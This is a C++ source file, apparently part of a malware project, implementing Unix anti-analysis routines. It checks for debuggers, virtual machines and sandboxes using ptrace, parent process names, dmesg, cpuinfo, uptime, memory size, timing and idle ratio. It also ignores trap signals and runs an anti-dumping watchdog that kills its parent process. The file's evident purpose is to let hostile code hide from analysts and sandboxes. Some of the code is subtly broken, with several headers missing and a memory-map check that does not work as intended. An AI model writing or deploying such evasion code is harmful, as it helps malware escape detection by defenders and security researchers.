#include "evasion/anti_analysis.h"
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <fstream>
#include <cstring>
#include <proc/readproc.h>

class UnixAntiAnalysis : public AntiAnalysis {
private:
    bool enabled;
    
public:
    UnixAntiAnalysis() : enabled(true) {}
    
    bool IsAnalysisEnvironment() override {
        if (!enabled) return false;
        
        return CheckDebugger() || CheckVM() || CheckSandbox() || 
               CheckTiming() || CheckUserActivity();
    }
    
private:
    bool CheckDebugger() {
        // Check if being traced by gdb/strace
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
            return true;
        }
        
        // Check for gdb in parent process
        pid_t ppid = getppid();
        char procPath[256];
        snprintf(procPath, sizeof(procPath), "/proc/%d/exe", ppid);
        
        struct stat st;
        if (stat(procPath, &st) == 0) {
            char buffer[256];
            ssize_t len = readlink(procPath, buffer, sizeof(buffer) - 1);
            if (len > 0) {
                buffer[len] = '\0';
                std::string exePath(buffer);
                if (exePath.find("gdb") != std::string::npos ||
                    exePath.find("strace") != std::string::npos ||
                    exePath.find("ltrace") != std::string::npos) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    bool CheckVM() {
        struct utsname unameData;
        if (uname(&unameData) == 0) {
            std::string hostname(unameData.nodename);
            std::string release(unameData.release);
            
            // Check for common VM signatures in hostname
            if (hostname.find("vmware") != std::string::npos ||
                hostname.find("virtualbox") != std::string::npos ||
                hostname.find("qemu") != std::string::npos ||
                hostname.find("kvm") != std::string::npos) {
                return true;
            }
            
            // Check for VM signatures in kernel release
            if (release.find("Microsoft") != std::string::npos ||  // WSL
                release.find("virtual") != std::string::npos) {
                return true;
            }
        }
        
        // Check dmesg for VM signatures
        std::ifstream dmesg("/var/log/dmesg");
        std::string line;
        while (std::getline(dmesg, line)) {
            if (line.find("VMware") != std::string::npos ||
                line.find("VirtualBox") != std::string::npos ||
                line.find("QEMU") != std::string::npos ||
                line.find("Xen") != std::string::npos) {
                return true;
            }
        }
        
        // Check CPU info for virtualization flags
        std::ifstream cpuinfo("/proc/cpuinfo");
        while (std::getline(cpuinfo, line)) {
            if (line.find("hypervisor") != std::string::npos) {
                return true;
            }
        }
        
        return false;
    }
    
    bool CheckSandbox() {
        // Check for sandbox environment indicators
        
        // Check for low uptime (sandbox systems often restart)
        std::ifstream uptime("/proc/uptime");
        double uptimeSeconds;
        if (uptime >> uptimeSeconds) {
            if (uptimeSeconds < 300) { // Less than 5 minutes
                return true;
            }
        }
        
        // Check for common sandbox processes
        std::vector<std::string> sandboxProcesses = {
            "python", "sandbox", "analyzer", "vboxservice",
            "vmtoolsd", "qemu-ga"
        };
        
        for (const auto& process : sandboxProcesses) {
            if (IsProcessRunning(process)) {
                return true;
            }
        }
        
        // Check for limited hardware (common in sandboxes)
        std::ifstream meminfo("/proc/meminfo");
        std::string memLine;
        while (std::getline(meminfo, memLine)) {
            if (memLine.find("MemTotal:") == 0) {
                unsigned long memKB;
                sscanf(memLine.c_str(), "MemTotal: %lu kB", &memKB);
                if (memKB < 1024 * 1024) { // Less than 1GB
                    return true;
                }
            }
        }
        
        return false;
    }
    
    bool CheckTiming() {
        // Timing-based anti-analysis
        auto start = std::chrono::high_resolution_clock::now();
        
        // Perform some computation
        volatile long sum = 0;
        for (int i = 0; i < 1000000; i++) {
            sum += i;
        }
        
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
        
        // If execution is too slow, likely in debugger/emulator
        return duration.count() > 100000; // 100ms threshold
    }
    
    bool CheckUserActivity() {
        // Check for user activity patterns
        std::ifstream uptime("/proc/uptime");
        double uptimeSeconds, idleSeconds;
        if (uptime >> uptimeSeconds >> idleSeconds) {
            // Calculate idle ratio
            double idleRatio = idleSeconds / uptimeSeconds;
            
            // High idle ratio suggests sandbox (no real user)
            if (idleRatio > 0.95) {
                return true;
            }
        }
        
        return false;
    }
    
    bool IsProcessRunning(const std::string& processName) {
        DIR* dir = opendir("/proc");
        if (!dir) return false;
        
        struct dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            if (!isdigit(entry->d_name[0])) continue;
            
            std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
            std::ifstream commFile(commPath);
            std::string comm;
            
            if (commFile >> comm) {
                if (comm.find(processName) != std::string::npos) {
                    closedir(dir);
                    return true;
                }
            }
        }
        
        closedir(dir);
        return false;
    }
    
public:
    void HideFromDebugger() override {
        // Anti-debugging techniques for Unix
        if (fork() != 0) {
            exit(0); // Parent exits, child continues
        }
        
        // Set up signal handlers to catch debugging attempts
        signal(SIGTRAP, SIG_IGN);
        signal(SIGINT, SIG_IGN);
    }
    
    void AntiDumping() override {
        // Anti-memory dumping
        // Note: More complex techniques would require kernel modules
        // This is a basic user-space implementation
        
        // Fork and monitor for memory access
        pid_t child = fork();
        if (child == 0) {
            // Child process monitors parent
            pid_t parent = getppid();
            
            // Monitor /proc/pid/maps for changes
            std::string mapsPath = "/proc/" + std::to_string(parent) + "/maps";
            struct stat lastStat;
            stat(mapsPath.c_str(), &lastStat);
            
            while (true) {
                struct stat currentStat;
                if (stat(mapsPath.c_str(), &currentStat) == 0) {
                    if (currentStat.st_mtime != lastStat.st_mtime) {
                        // Memory map changed - potential dumping
                        kill(parent, SIGKILL);
                        exit(0);
                    }
                }
                usleep(100000); // Check every 100ms
            }
        }
    }
};
